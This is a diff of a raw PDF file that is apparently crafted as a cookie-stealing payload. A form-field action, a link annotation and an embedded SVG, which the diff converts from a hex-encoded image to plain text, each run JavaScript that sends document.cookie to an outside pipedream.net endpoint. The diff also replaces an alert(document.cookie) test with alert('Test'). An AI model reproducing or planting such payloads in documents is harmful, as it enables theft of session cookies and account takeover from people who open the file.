@@ -19,7 +19,7 @@ ET
 endstream
 endobj
 5 0 obj
-<< /Font << /F1 6 0 R >> /XObject << /Img1 15 0 R >> >>
+<< /Font << /F1 6 0 R >> /XObject << /Svg1 15 0 R >> >>
 endobj
 6 0 obj
 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R >>
@@ -31,7 +31,7 @@ endobj
 << /Names [(EmbeddedScript) 11 0 R] >>
 endobj
 11 0 obj
-<< /S /JavaScript /JS (alert(document.cookie);) >>
+<< /S /JavaScript /JS (alert('Test');) >>
 endobj
 12 0 obj
 << /Type /Annot /Subtype /Widget /FT /Tx /T (Field1) /V (Test) /Rect [100 100 200 120] /AA << /F << /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://eoy4evvlsf7y0jq.m.pipedream.net?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >> >> >>
@@ -41,7 +41,7 @@ endobj
 stream
 q
 100 0 0 100 100 100 cm
-/Img1 Do
+/Svg1 Do
 Q
 endstream
 endobj
@@ -49,9 +49,15 @@ endobj
 << /Type /Annot /Subtype /Link /Rect [100 150 200 170] /A << /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://eoy4evvlsf7y0jq.m.pipedream.net?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >> >>
 endobj
 15 0 obj
-<< /Type /XObject /Subtype /Image /Width 100 /Height 100 /Filter /ASCIIHexDecode /Length 114 >>
+<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Resources << >> /Length 114 >>
 stream
-3C73766720786D6C6E733D22687474703A2F2F7777772E77332E6F72672F323030302F737667223E3C7363726970743E766172207868723D6E657720584D4C487474705265717565737428293B7868722E6F70656E2827474554272C272768747470733A2F2F656F79346576766C73663779306A712E6D2E70697065647265616D2E6E65743F636F6F6B69653D272B656E636F6465555249436F6D706F6E656E7428646F63756D656E742E636F6F6B6965292C74727565293B7868722E73656E6428293B3C2F7363726970743E3C2F7376673E
+q
+100 0 0 100 0 0 cm
+/GS0 gs
+<</MC0<</MCID 0>>>>BDC
+<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg"><script>var xhr=new XMLHttpRequest();xhr.open('GET','https://eoy4evvlsf7y0jq.m.pipedream.net?cookie='+encodeURIComponent(document.cookie),true);xhr.send();</script></svg>
+EMC
+Q
 endstream
 endobj
 16 0 obj
@@ -69,23 +75,23 @@ xref
 0 17
 0000000000 65535 f 
 0000000010 00000 n 
-0000000087 00000 n 
-0000000144 00000 n 
-0000000237 00000 n 
-0000000307 00000 n 
-0000000345 00000 n 
-0000000457 00000 n 
+0000000095 00000 n 
+0000000152 00000 n 
+0000000245 00000 n 
+0000000315 00000 n 
+0000000353 00000 n 
+0000000465 00000 n 
 0000000000 65535 f 
 0000000000 65535 f 
-0000000543 00000 n 
-0000000578 00000 n 
-0000000723 00000 n 
-0000000855 00000 n 
-0000001000 00000 n 
-0000001133 00000 n 
-0000001278 00000 n 
+0000000551 00000 n 
+0000000586 00000 n 
+0000000731 00000 n 
+0000000863 00000 n 
+0000001008 00000 n 
+0000001152 00000 n 
+0000001297 00000 n 
 trailer
 << /Size 17 /Root 1 0 R >>
 startxref
-1474
+1482
 %%EOF
